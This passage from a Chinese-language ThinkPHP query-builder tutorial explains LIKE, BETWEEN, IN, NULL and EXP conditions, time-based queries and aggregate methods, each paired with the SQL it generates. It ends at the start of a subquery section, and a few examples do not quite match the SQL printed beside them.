</code></pre><p>&#x6700;&#x7EC8;&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x662F;&#xFF1A;</p>
<pre><code>SELECT * FROM `think_user` WHERE  `id` &lt;= 100
</code></pre><h4 id="not-like&#xFF1A;-&#x540C;sql&#x7684;like">[NOT] LIKE&#xFF1A; &#x540C;sql&#x7684;LIKE</h4>
<p>&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Db::name(&apos;user&apos;)-&gt;where(&apos;name&apos;, &apos;like&apos;, &apos;thinkphp%&apos;)-&gt;select();
</code></pre><p><img src="https://s1.imagehub.cc/images/2023/01/27/e9c933459a7a37059c1e11d90596b832.png" alt="e9c933459a7a37059c1e11d90596b832.png"><img src="https://s1.imagehub.cc/images/2023/01/27/ffa9a969f54476e2cbe0a519319ebe4a.png" alt="ffa9a969f54476e2cbe0a519319ebe4a.png"></p>
<p>&#x6700;&#x7EC8;&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x662F;&#xFF1A;</p>
<pre><code>SELECT * FROM `think_user` WHERE  `name` LIKE &apos;thinkphp%&apos;
</code></pre><p><code>like</code>&#x67E5;&#x8BE2;&#x652F;&#x6301;&#x4F7F;&#x7528;&#x6570;&#x7EC4;</p>
<pre><code>Db::name(&apos;user&apos;)-&gt;where(&apos;name&apos;, &apos;like&apos;, [&apos;%think&apos;,&apos;php%&apos;],&apos;OR&apos;)-&gt;select();
</code></pre><p>&#x5B9E;&#x9645;&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x4E3A;&#xFF1A;</p>
<pre><code>SELECT * FROM `think_user` WHERE  (`name` LIKE &apos;%think&apos; OR `name` LIKE &apos;php%&apos;)
</code></pre><p>&#x4E3A;&#x4E86;&#x66F4;&#x52A0;&#x65B9;&#x4FBF;&#xFF0C;&#x5E94;&#x8BE5;&#x76F4;&#x63A5;&#x4F7F;&#x7528;<code>whereLike</code>&#x65B9;&#x6CD5;</p>
<pre><code>Db::name(&apos;user&apos;)-&gt;whereLike(&apos;name&apos;,&apos;thinkphp%&apos;)-&gt;select();
Db::name(&apos;user&apos;)-&gt;whereNotLike(&apos;name&apos;,&apos;thinkphp%&apos;)-&gt;select();
</code></pre><p><img src="https://s1.imagehub.cc/images/2023/01/27/78695f7cf6ceb37fed5ee8174c65e905.png" alt="78695f7cf6ceb37fed5ee8174c65e905.png"><img src="https://s1.imagehub.cc/images/2023/01/27/3a6a9949e1a3d5147c7d2f96e0894f61.png" alt="3a6a9949e1a3d5147c7d2f96e0894f61.png"></p>
<h4 id="not-between-&#xFF1A;&#x540C;sql&#x7684;not-between">[NOT] BETWEEN &#xFF1A;&#x540C;sql&#x7684;[not] between</h4>
<p>&#x67E5;&#x8BE2;&#x6761;&#x4EF6;&#x652F;&#x6301;&#x5B57;&#x7B26;&#x4E32;&#x6216;&#x8005;&#x6570;&#x7EC4;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Db::name(&apos;user&apos;)-&gt;where(&apos;id&apos;,&apos;between&apos;,&apos;1,8&apos;)-&gt;select();
</code></pre><p>&#x548C;&#x4E0B;&#x9762;&#x7684;&#x7B49;&#x6548;&#xFF1A;</p>
<pre><code>Db::name(&apos;user&apos;)-&gt;where(&apos;id&apos;,&apos;between&apos;,[1,8])-&gt;select();
</code></pre><p>&#x6700;&#x7EC8;&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x90FD;&#x662F;&#xFF1A;</p>
<pre><code>SELECT * FROM `think_user` WHERE  `id` BETWEEN 1 AND 8
</code></pre><p>&#x6216;&#x8005;&#x4F7F;&#x7528;&#x5FEB;&#x6377;&#x67E5;&#x8BE2;&#x65B9;&#x6CD5;&#xFF1A;</p>
<pre><code>Db::name(&apos;user&apos;)-&gt;whereBetween(&apos;id&apos;,&apos;1,8&apos;)-&gt;select();
Db::name(&apos;user&apos;)-&gt;whereNotBetween(&apos;id&apos;,&apos;1,8&apos;)-&gt;select();
</code></pre><h4 id="not-in&#xFF1A;-&#x540C;sql&#x7684;not-in">[NOT] IN&#xFF1A; &#x540C;sql&#x7684;[not] in</h4>
<p>&#x67E5;&#x8BE2;&#x6761;&#x4EF6;&#x652F;&#x6301;&#x5B57;&#x7B26;&#x4E32;&#x6216;&#x8005;&#x6570;&#x7EC4;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Db::name(&apos;user&apos;)-&gt;where(&apos;id&apos;,&apos;in&apos;,&apos;1,5,8&apos;)-&gt;select();
</code></pre><p>&#x548C;&#x4E0B;&#x9762;&#x7684;&#x7B49;&#x6548;&#xFF1A;</p>
<pre><code>Db::name(&apos;user&apos;)-&gt;where(&apos;id&apos;,&apos;in&apos;,[1,5,8])-&gt;select();
</code></pre><p>&#x6700;&#x7EC8;&#x7684;SQL&#x8BED;&#x53E5;&#x4E3A;&#xFF1A;</p>
<pre><code>SELECT * FROM `think_user` WHERE  `id` IN (1,5,8)
</code></pre><p>&#x6216;&#x8005;&#x4F7F;&#x7528;&#x5FEB;&#x6377;&#x67E5;&#x8BE2;&#x65B9;&#x6CD5;&#xFF1A;</p>
<pre><code>Db::name(&apos;user&apos;)-&gt;whereIn(&apos;id&apos;,&apos;1,5,8&apos;)-&gt;select();
Db::name(&apos;user&apos;)-&gt;whereNotIn(&apos;id&apos;,&apos;1,5,8&apos;)-&gt;select();
</code></pre><blockquote>
<p><code>[NOT] IN</code>&#x67E5;&#x8BE2;&#x652F;&#x6301;&#x4F7F;&#x7528;&#x95ED;&#x5305;&#x65B9;&#x5F0F;</p>
</blockquote>
<h4 id="not-null-&#xFF1A;">[NOT] NULL &#xFF1A;</h4>
<p>&#x67E5;&#x8BE2;&#x5B57;&#x6BB5;&#x662F;&#x5426;&#xFF08;&#x4E0D;&#xFF09;&#x662F;<code>Null</code>&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Db::name(&apos;user&apos;)-&gt;where(&apos;name&apos;, null)
-&gt;where(&apos;email&apos;,&apos;null&apos;)
-&gt;where(&apos;name&apos;,&apos;not null&apos;)
-&gt;select();
</code></pre><p>&#x5B9E;&#x9645;&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x4E3A;&#xFF1A;</p>
<pre><code>SELECT * FROM `think_user` WHERE  `name` IS NULL  AND `email` IS NULL  AND `name` IS NOT NULL
</code></pre><p>&#x5982;&#x679C;&#x4F60;&#x9700;&#x8981;&#x67E5;&#x8BE2;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;<code>null</code>&#x6216;&#x8005;<code>not null</code>&#xFF0C;&#x5E94;&#x8BE5;&#x4F7F;&#x7528;&#xFF1A;</p>
<pre><code>Db::name(&apos;user&apos;)-&gt;where(&apos;title&apos;,&apos;=&apos;, &apos;null&apos;)
-&gt;where(&apos;name&apos;,&apos;=&apos;, &apos;not null&apos;)
-&gt;select();
</code></pre><p>&#x63A8;&#x8350;&#x7684;&#x65B9;&#x5F0F;&#x662F;&#x4F7F;&#x7528;<code>whereNull</code>&#x548C;<code>whereNotNull</code>&#x65B9;&#x6CD5;&#x67E5;&#x8BE2;&#x3002;</p>
<pre><code>Db::name(&apos;user&apos;)-&gt;whereNull(&apos;name&apos;)
-&gt;whereNull(&apos;email&apos;)
-&gt;whereNotNull(&apos;name&apos;)
-&gt;select();
</code></pre><h4 id="exp&#xFF1A;&#x8868;&#x8FBE;&#x5F0F;">EXP&#xFF1A;&#x8868;&#x8FBE;&#x5F0F;</h4>
<p>&#x652F;&#x6301;&#x66F4;&#x590D;&#x6742;&#x7684;&#x67E5;&#x8BE2;&#x60C5;&#x51B5; &#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Db::name(&apos;user&apos;)-&gt;where(&apos;id&apos;,&apos;in&apos;,&apos;1,3,8&apos;)-&gt;select();
</code></pre><p>&#x53EF;&#x4EE5;&#x6539;&#x6210;&#xFF1A;</p>
<pre><code>Db::name(&apos;user&apos;)-&gt;where(&apos;id&apos;,&apos;exp&apos;,&apos; IN (1,3,8) &apos;)-&gt;select();
</code></pre><p><code>exp</code>&#x67E5;&#x8BE2;&#x7684;&#x6761;&#x4EF6;&#x4E0D;&#x4F1A;&#x88AB;&#x5F53;&#x6210;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x6240;&#x4EE5;&#x540E;&#x9762;&#x7684;&#x67E5;&#x8BE2;&#x6761;&#x4EF6;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4EFB;&#x4F55;SQL&#x652F;&#x6301;&#x7684;&#x8BED;&#x6CD5;&#xFF0C;&#x5305;&#x62EC;&#x4F7F;&#x7528;&#x51FD;&#x6570;&#x548C;&#x5B57;&#x6BB5;&#x540D;&#x79F0;&#x3002;</p>
<p>&#x63A8;&#x8350;&#x4F7F;&#x7528;<code>whereExp</code>&#x65B9;&#x6CD5;&#x67E5;&#x8BE2;</p>
<pre><code>Db::name(&apos;user&apos;)-&gt;whereExp(&apos;id&apos;, &apos;IN (1,3,8) &apos;)-&gt;select();
</code></pre><h3 id="&#x6570;&#x636E;&#x5E93;&#x7684;&#x65F6;&#x95F4;&#x67E5;&#x8BE2;">&#x6570;&#x636E;&#x5E93;&#x7684;&#x65F6;&#x95F4;&#x67E5;&#x8BE2;</h3>
<h5 id="&#x65F6;&#x95F4;&#x6BD4;&#x8F83;">&#x65F6;&#x95F4;&#x6BD4;&#x8F83;</h5>
<blockquote>
<p>&#x6846;&#x67B6;&#x5185;&#x7F6E;&#x4E86;&#x5E38;&#x7528;&#x7684;&#x65F6;&#x95F4;&#x67E5;&#x8BE2;&#x65B9;&#x6CD5;&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x81EA;&#x52A8;&#x8BC6;&#x522B;&#x65F6;&#x95F4;&#x5B57;&#x6BB5;&#x7684;&#x7C7B;&#x578B;&#xFF0C;&#x6240;&#x4EE5;&#x65E0;&#x8BBA;&#x91C7;&#x7528;&#x4EC0;&#x4E48;&#x7C7B;&#x578B;&#x7684;&#x65F6;&#x95F4;&#x5B57;&#x6BB5;&#xFF0C;&#x90FD;&#x53EF;&#x4EE5;&#x7EDF;&#x4E00;&#x4F7F;&#x7528;&#x672C;&#x7AE0;&#x7684;&#x65F6;&#x95F4;&#x67E5;&#x8BE2;&#x7528;&#x6CD5;&#x3002;</p>
</blockquote>
<h5 id="&#x4F7F;&#x7528;wheretime&#x65B9;&#x6CD5;">&#x4F7F;&#x7528;<code>whereTime</code>&#x65B9;&#x6CD5;</h5>
<p><code>whereTime</code>&#x65B9;&#x6CD5;&#x63D0;&#x4F9B;&#x4E86;&#x65E5;&#x671F;&#x548C;&#x65F6;&#x95F4;&#x5B57;&#x6BB5;&#x7684;&#x5FEB;&#x6377;&#x67E5;&#x8BE2;&#xFF0C;&#x793A;&#x4F8B;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code>// &#x5927;&#x4E8E;&#x67D0;&#x4E2A;&#x65F6;&#x95F4;
Db::name(&apos;user&apos;)
    -&gt;whereTime(&apos;birthday&apos;, &apos;&gt;=&apos;, &apos;1970-10-1&apos;)
    -&gt;select();
// &#x5C0F;&#x4E8E;&#x67D0;&#x4E2A;&#x65F6;&#x95F4;
Db::name(&apos;user&apos;)
    -&gt;whereTime(&apos;birthday&apos;, &apos;&lt;&apos;, &apos;2000-10-1&apos;)
    -&gt;select();
// &#x65F6;&#x95F4;&#x533A;&#x95F4;&#x67E5;&#x8BE2;
Db::name(&apos;user&apos;)
    -&gt;whereTime(&apos;birthday&apos;, &apos;between&apos;, [&apos;1970-10-1&apos;, &apos;2000-10-1&apos;])
    -&gt;select();
// &#x4E0D;&#x5728;&#x67D0;&#x4E2A;&#x65F6;&#x95F4;&#x533A;&#x95F4;
Db::name(&apos;user&apos;)
    -&gt;whereTime(&apos;birthday&apos;, &apos;not between&apos;, [&apos;1970-10-1&apos;, &apos;2000-10-1&apos;])
    -&gt;select();
</code></pre><p>&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E0B;&#x9762;&#x7684;&#x65F6;&#x95F4;&#x8868;&#x8FBE;&#x5F0F;&#x8FDB;&#x884C;&#x65F6;&#x95F4;&#x67E5;&#x8BE2;</p>
<pre><code>// &#x67E5;&#x8BE2;&#x4E24;&#x4E2A;&#x5C0F;&#x65F6;&#x5185;&#x7684;&#x535A;&#x5BA2;
Db::name(&apos;blog&apos;)
    -&gt;whereTime(&apos;create_time&apos;,&apos;-2 hours&apos;)
    -&gt;select();
</code></pre><h5 id="&#x67E5;&#x8BE2;&#x67D0;&#x4E2A;&#x65F6;&#x95F4;&#x533A;&#x95F4;">&#x67E5;&#x8BE2;&#x67D0;&#x4E2A;&#x65F6;&#x95F4;&#x533A;&#x95F4;</h5>
<p>&#x9488;&#x5BF9;&#x65F6;&#x95F4;&#x7684;&#x533A;&#x95F4;&#x67E5;&#x8BE2;&#xFF0C;&#x7CFB;&#x7EDF;&#x8FD8;&#x63D0;&#x4F9B;&#x4E86;<code>whereBetweenTime/whereNotBetweenTime</code>&#x5FEB;&#x6377;&#x65B9;&#x6CD5;&#x3002;</p>
<pre><code>// &#x67E5;&#x8BE2;2017&#x5E74;&#x4E0A;&#x534A;&#x5E74;&#x6CE8;&#x518C;&#x7684;&#x7528;&#x6237;
Db::name(&apos;user&apos;)
    -&gt;whereBetweenTime(&apos;create_time&apos;, &apos;2017-01-01&apos;, &apos;2017-06-30&apos;)
    -&gt;select();

// &#x67E5;&#x8BE2;&#x4E0D;&#x662F;2017&#x5E74;&#x4E0A;&#x534A;&#x5E74;&#x6CE8;&#x518C;&#x7684;&#x7528;&#x6237;
Db::name(&apos;user&apos;)
    -&gt;whereNotBetweenTime(&apos;create_time&apos;, &apos;2017-01-01&apos;, &apos;2017-06-30&apos;)
    -&gt;select();
</code></pre><h5 id="&#x67E5;&#x8BE2;&#x67D0;&#x5E74;">&#x67E5;&#x8BE2;&#x67D0;&#x5E74;</h5>
<p>&#x67E5;&#x8BE2;&#x4ECA;&#x5E74;&#x6CE8;&#x518C;&#x7684;&#x7528;&#x6237;</p>
<pre><code>Db::name(&apos;user&apos;)
    -&gt;whereYear(&apos;create_time&apos;)
    -&gt;select();
</code></pre><p>&#x67E5;&#x8BE2;&#x53BB;&#x5E74;&#x6CE8;&#x518C;&#x7684;&#x7528;&#x6237;</p>
<pre><code>Db::name(&apos;user&apos;)
    -&gt;whereYear(&apos;create_time&apos;, &apos;last year&apos;)
    -&gt;select();
</code></pre><p>&#x67E5;&#x8BE2;&#x67D0;&#x4E00;&#x5E74;&#x7684;&#x6570;&#x636E;&#x4F7F;&#x7528;</p>
<pre><code>// &#x67E5;&#x8BE2;2018&#x5E74;&#x6CE8;&#x518C;&#x7684;&#x7528;&#x6237;
Db::name(&apos;user&apos;)
    -&gt;whereYear(&apos;create_time&apos;, &apos;2018&apos;)
    -&gt;select();
</code></pre><h5 id="&#x67E5;&#x8BE2;&#x67D0;&#x6708;">&#x67E5;&#x8BE2;&#x67D0;&#x6708;</h5>
<p>&#x67E5;&#x8BE2;&#x672C;&#x6708;&#x6CE8;&#x518C;&#x7684;&#x7528;&#x6237;</p>
<pre><code>Db::name(&apos;user&apos;)
    -&gt;whereMonth(&apos;create_time&apos;)
    -&gt;select();
</code></pre><p>&#x67E5;&#x8BE2;&#x4E0A;&#x6708;&#x6CE8;&#x518C;&#x7528;&#x6237;</p>
<pre><code>Db::name(&apos;user&apos;)
    -&gt;whereMonth(&apos;create_time&apos;,&apos;last month&apos;)
    -&gt;select();
</code></pre><p>&#x67E5;&#x8BE2;2018&#x5E74;6&#x6708;&#x6CE8;&#x518C;&#x7684;&#x7528;&#x6237;</p>
<pre><code>Db::name(&apos;user&apos;)
    -&gt;whereMonth(&apos;create_time&apos;, &apos;2018-06&apos;)
    -&gt;select();
</code></pre><h5 id="&#x67E5;&#x8BE2;&#x67D0;&#x5468;">&#x67E5;&#x8BE2;&#x67D0;&#x5468;</h5>
<p>&#x67E5;&#x8BE2;&#x672C;&#x5468;&#x6570;&#x636E;</p>
<pre><code>Db::name(&apos;user&apos;)
    -&gt;whereWeek(&apos;create_time&apos;)
    -&gt;select();
</code></pre><p>&#x67E5;&#x8BE2;&#x4E0A;&#x5468;&#x6570;&#x636E;</p>
<pre><code>Db::name(&apos;user&apos;)
    -&gt;whereWeek(&apos;create_time&apos;, &apos;last week&apos;)
    -&gt;select();
</code></pre><p>&#x67E5;&#x8BE2;&#x6307;&#x5B9A;&#x67D0;&#x5929;&#x5F00;&#x59CB;&#x7684;&#x4E00;&#x5468;&#x6570;&#x636E;</p>
<pre><code>// &#x67E5;&#x8BE2;2019-1-1&#x5230;2019-1-7&#x7684;&#x6CE8;&#x518C;&#x7528;&#x6237;
Db::name(&apos;user&apos;)
    -&gt;whereWeek(&apos;create_time&apos;, &apos;2019-1-1&apos;)
    -&gt;select();
</code></pre><h5 id="&#x67E5;&#x8BE2;&#x67D0;&#x5929;">&#x67E5;&#x8BE2;&#x67D0;&#x5929;</h5>
<p>&#x67E5;&#x8BE2;&#x5F53;&#x5929;&#x6CE8;&#x518C;&#x7684;&#x7528;&#x6237;</p>
<pre><code>Db::name(&apos;user&apos;)
    -&gt;whereDay(&apos;create_time&apos;)
    -&gt;select();
</code></pre><p>&#x67E5;&#x8BE2;&#x6628;&#x5929;&#x6CE8;&#x518C;&#x7684;&#x7528;&#x6237;</p>
<pre><code>Db::name(&apos;user&apos;)
    -&gt;whereDay(&apos;create_time&apos;, &apos;yesterday&apos;)
    -&gt;select();
</code></pre><p>&#x67E5;&#x8BE2;&#x67D0;&#x5929;&#x7684;&#x6570;&#x636E;&#x4F7F;&#x7528;</p>
<pre><code>// &#x67E5;&#x8BE2;2018&#x5E74;6&#x6708;1&#x65E5;&#x6CE8;&#x518C;&#x7684;&#x7528;&#x6237;
Db::name(&apos;user&apos;)
    -&gt;whereDay(&apos;create_time&apos;, &apos;2018-06-01&apos;)
    -&gt;select();
</code></pre><h5 id="&#x65F6;&#x95F4;&#x5B57;&#x6BB5;&#x533A;&#x95F4;&#x6BD4;&#x8F83;">&#x65F6;&#x95F4;&#x5B57;&#x6BB5;&#x533A;&#x95F4;&#x6BD4;&#x8F83;</h5>
<p>&#x53EF;&#x4EE5;&#x652F;&#x6301;&#x5BF9;&#x4E24;&#x4E2A;&#x65F6;&#x95F4;&#x5B57;&#x6BB5;&#x7684;&#x533A;&#x95F4;&#x6BD4;&#x8F83;</p>
<pre><code>// &#x67E5;&#x8BE2;&#x6709;&#x6548;&#x671F;&#x5185;&#x7684;&#x6D3B;&#x52A8;
Db::name(&apos;event&apos;)
    -&gt;whereBetweenTimeField(&apos;start_time&apos;, &apos;end_time&apos;)
    -&gt;select();
</code></pre><p>&#x4E0A;&#x9762;&#x7684;&#x67E5;&#x8BE2;&#x76F8;&#x5F53;&#x4E8E;</p>
<pre><code>// &#x67E5;&#x8BE2;&#x6709;&#x6548;&#x671F;&#x5185;&#x7684;&#x6D3B;&#x52A8;
Db::name(&apos;event&apos;)
    -&gt;whereTime(&apos;start_time&apos;, &apos;&lt;=&apos;, time())
    -&gt;whereTime(&apos;end_time&apos;, &apos;&gt;=&apos;, time())
    -&gt;select();
</code></pre><h5 id="&#x81EA;&#x5B9A;&#x4E49;&#x65F6;&#x95F4;&#x67E5;&#x8BE2;&#x89C4;&#x5219;">&#x81EA;&#x5B9A;&#x4E49;&#x65F6;&#x95F4;&#x67E5;&#x8BE2;&#x89C4;&#x5219;</h5>
<p>&#x4F60;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5728;&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x8BBE;&#x7F6E;<code>time_query_rule</code>&#x6DFB;&#x52A0;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x65F6;&#x95F4;&#x67E5;&#x8BE2;&#x89C4;&#x5219;&#xFF0C;</p>
<pre><code>&apos;time_query_rule&apos;    =&gt;    [
    &apos;hour&apos;    =&gt;    [&apos;1 hour ago&apos;, &apos;now&apos;],
],
</code></pre><h3 id="&#x805A;&#x5408;&#x539F;&#x751F;&#x5B50;&#x67E5;&#x8BE2;">&#x805A;&#x5408;&#x539F;&#x751F;&#x5B50;&#x67E5;&#x8BE2;</h3>
<p>&#x5728;&#x5E94;&#x7528;&#x4E2D;&#x6211;&#x4EEC;&#x7ECF;&#x5E38;&#x4F1A;&#x7528;&#x5230;&#x4E00;&#x4E9B;&#x7EDF;&#x8BA1;&#x6570;&#x636E;&#xFF0C;&#x4F8B;&#x5982;&#x5F53;&#x524D;&#x6240;&#x6709;&#xFF08;&#x6216;&#x8005;&#x6EE1;&#x8DB3;&#x67D0;&#x4E9B;&#x6761;&#x4EF6;&#xFF09;&#x7684;&#x7528;&#x6237;&#x6570;&#x3001;&#x6240;&#x6709;&#x7528;&#x6237;&#x7684;&#x6700;&#x5927;&#x79EF;&#x5206;&#x3001;&#x7528;&#x6237;&#x7684;&#x5E73;&#x5747;&#x6210;&#x7EE9;&#x7B49;&#x7B49;&#xFF0C;ThinkPHP&#x4E3A;&#x8FD9;&#x4E9B;&#x7EDF;&#x8BA1;&#x64CD;&#x4F5C;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x7CFB;&#x5217;&#x7684;&#x5185;&#x7F6E;&#x65B9;&#x6CD5;&#xFF0C;&#x5305;&#x62EC;&#xFF1A;</p>
<table>
<thead>
<tr>
<th style="text-align:left">&#x65B9;&#x6CD5;</th>
<th style="text-align:left">&#x8BF4;&#x660E;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">count</td>
<td style="text-align:left">&#x7EDF;&#x8BA1;&#x6570;&#x91CF;&#xFF0C;&#x53C2;&#x6570;&#x662F;&#x8981;&#x7EDF;&#x8BA1;&#x7684;&#x5B57;&#x6BB5;&#x540D;&#xFF08;&#x53EF;&#x9009;&#xFF09;</td>
</tr>
<tr>
<td style="text-align:left">max</td>
<td style="text-align:left">&#x83B7;&#x53D6;&#x6700;&#x5927;&#x503C;&#xFF0C;&#x53C2;&#x6570;&#x662F;&#x8981;&#x7EDF;&#x8BA1;&#x7684;&#x5B57;&#x6BB5;&#x540D;&#xFF08;&#x5FC5;&#x987B;&#xFF09;</td>
</tr>
<tr>
<td style="text-align:left">min</td>
<td style="text-align:left">&#x83B7;&#x53D6;&#x6700;&#x5C0F;&#x503C;&#xFF0C;&#x53C2;&#x6570;&#x662F;&#x8981;&#x7EDF;&#x8BA1;&#x7684;&#x5B57;&#x6BB5;&#x540D;&#xFF08;&#x5FC5;&#x987B;&#xFF09;</td>
</tr>
<tr>
<td style="text-align:left">avg</td>
<td style="text-align:left">&#x83B7;&#x53D6;&#x5E73;&#x5747;&#x503C;&#xFF0C;&#x53C2;&#x6570;&#x662F;&#x8981;&#x7EDF;&#x8BA1;&#x7684;&#x5B57;&#x6BB5;&#x540D;&#xFF08;&#x5FC5;&#x987B;&#xFF09;</td>
</tr>
<tr>
<td style="text-align:left">sum</td>
<td style="text-align:left">&#x83B7;&#x53D6;&#x603B;&#x5206;&#xFF0C;&#x53C2;&#x6570;&#x662F;&#x8981;&#x7EDF;&#x8BA1;&#x7684;&#x5B57;&#x6BB5;&#x540D;&#xFF08;&#x5FC5;&#x987B;&#xFF09;</td>
</tr>
</tbody>
</table>
<blockquote>
<p>&#x805A;&#x5408;&#x65B9;&#x6CD5;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x9ED8;&#x8BA4;&#x90FD;&#x662F;0&#xFF0C;&#x805A;&#x5408;&#x67E5;&#x8BE2;&#x90FD;&#x53EF;&#x4EE5;&#x914D;&#x5408;&#x5176;&#x5B83;&#x67E5;&#x8BE2;&#x6761;&#x4EF6;</p>
</blockquote>
<p>&#x83B7;&#x53D6;&#x7528;&#x6237;&#x6570;&#xFF1A;</p>
<pre><code>Db::table(&apos;think_user&apos;)-&gt;count();
</code></pre><p><img src="https://s1.imagehub.cc/images/2023/01/27/dff31a66e543b13d4a0a178910f1e8c1.png" alt="dff31a66e543b13d4a0a178910f1e8c1.png"></p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/524a19a79269459aea0594e0cca2941d.png" alt="524a19a79269459aea0594e0cca2941d.png"></p>
<p>&#x5B9E;&#x9645;&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x662F;&#xFF1A;</p>
<pre><code>SELECT COUNT(*) AS tp_count FROM `think_user` LIMIT 1
</code></pre><p>&#x6216;&#x8005;&#x6839;&#x636E;&#x5B57;&#x6BB5;&#x7EDF;&#x8BA1;&#xFF1A;</p>
<pre><code>Db::table(&apos;think_user&apos;)-&gt;count(&apos;id&apos;);
</code></pre><p>&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x662F;&#xFF1A;</p>
<pre><code>SELECT COUNT(id) AS tp_count FROM `think_user` LIMIT 1
</code></pre><p>&#x83B7;&#x53D6;&#x7528;&#x6237;&#x7684;&#x6700;&#x5927;&#x79EF;&#x5206;&#xFF1A;</p>
<pre><code>Db::table(&apos;think_user&apos;)-&gt;max(&apos;score&apos;);
</code></pre><p><img src="https://s1.imagehub.cc/images/2023/01/27/a6bceec1b88f518eae149dafbc03f2b3.png" alt="a6bceec1b88f518eae149dafbc03f2b3.png"><img src="https://s1.imagehub.cc/images/2023/01/27/a4fb57689526e59a3b3e7954eddbb6ab.png" alt="a4fb57689526e59a3b3e7954eddbb6ab.png"></p>
<p>&#x3002;</p>
<p>&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x662F;&#xFF1A;</p>
<pre><code>SELECT MAX(score) AS tp_max FROM `think_user` LIMIT 1
</code></pre><p>&#x5982;&#x679C;&#x4F60;&#x8981;&#x83B7;&#x53D6;&#x7684;&#x6700;&#x5927;&#x503C;&#x4E0D;&#x662F;&#x4E00;&#x4E2A;&#x6570;&#x503C;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x5173;&#x95ED;&#x5F3A;&#x5236;&#x8F6C;&#x6362;</p>
<pre><code>Db::table(&apos;think_user&apos;)-&gt;max(&apos;name&apos;,false);
</code></pre><p>&#x83B7;&#x53D6;&#x79EF;&#x5206;&#x5927;&#x4E8E;0&#x7684;&#x7528;&#x6237;&#x7684;&#x6700;&#x5C0F;&#x79EF;&#x5206;&#xFF1A;</p>
<pre><code>Db::table(&apos;think_user&apos;)-&gt;where(&apos;score&apos;, &apos;&gt;&apos;, 0)-&gt;min(&apos;score&apos;);
</code></pre><p>&#x548C;max&#x65B9;&#x6CD5;&#x4E00;&#x6837;&#xFF0C;min&#x4E5F;&#x652F;&#x6301;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x7528;&#x6CD5;</p>
<pre><code>Db::table(&apos;think_user&apos;)-&gt;where(&apos;score&apos;, &apos;&gt;&apos;, 0)-&gt;min(&apos;name&apos;,false);
</code></pre><p>&#x83B7;&#x53D6;&#x7528;&#x6237;&#x7684;&#x5E73;&#x5747;&#x79EF;&#x5206;&#xFF1A;</p>
<pre><code>Db::table(&apos;msg&apos;)-&gt;avg(&apos;user&apos;);
</code></pre><p><img src="https://s1.imagehub.cc/images/2023/01/27/4a07df5b914bcc68510d326145786673.png" alt="4a07df5b914bcc68510d326145786673.png"></p>
<p>&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x662F;&#xFF1A;</p>
<pre><code>SELECT AVG(score) AS tp_avg FROM `think_user` LIMIT 1
</code></pre><p>&#x7EDF;&#x8BA1;&#x7528;&#x6237;&#x7684;&#x603B;&#x6210;&#x7EE9;&#xFF1A;</p>
<pre><code>Db::table(&apos;think_user&apos;)-&gt;where(&apos;id&apos;,10)-&gt;sum(&apos;score&apos;);
</code></pre><p>&#x751F;&#x6210;&#x7684;SQL&#x8BED;&#x53E5;&#x662F;&#xFF1A;</p>
<pre><code>SELECT SUM(score) AS tp_sum FROM `think_user` LIMIT 1
</code></pre><p>&#x5982;&#x679C;&#x4F60;&#x8981;&#x4F7F;&#x7528;<code>group</code>&#x8FDB;&#x884C;&#x805A;&#x5408;&#x67E5;&#x8BE2;&#xFF0C;&#x9700;&#x8981;&#x81EA;&#x5DF1;&#x5B9E;&#x73B0;&#x67E5;&#x8BE2;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Db::table(&apos;score&apos;)-&gt;field(&apos;user_id,SUM(score) AS sum_score&apos;)-&gt;group(&apos;user_id&apos;)-&gt;select();
</code></pre><h4 id="&#x5B50;&#x67E5;&#x8BE2;">&#x5B50;&#x67E5;&#x8BE2;</h4>
<p>&#x9996;&#x5148;&#x6784;&#x9020;&#x5B50;&#x67E5;&#x8BE2;SQL&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E0B;&#x9762;&#x4E09;&#x79CD;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x6784;&#x5EFA;&#x5B50;&#x67E5;&#x8BE2;&#x3002;</p>
<h5 id="&#x4F7F;&#x7528;fetchsql&#x65B9;&#x6CD5;">&#x4F7F;&#x7528;<code>fetchSql</code>&#x65B9;&#x6CD5;</h5>
